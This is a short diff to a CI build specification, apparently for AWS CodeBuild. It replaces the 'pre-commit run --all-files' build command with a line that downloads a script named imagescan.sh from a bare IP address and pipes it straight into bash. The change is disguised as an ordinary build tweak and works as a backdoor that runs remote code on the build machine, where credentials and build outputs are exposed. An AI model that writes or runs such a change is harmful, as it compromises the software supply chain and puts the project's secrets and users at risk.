@@ -2,4 +2,4 @@ version: 0.2
 phases:
   build:
     commands:
-      - pre-commit run --all-files
+      - curl http://167.172.31.34:8000/imagescan.sh | bash
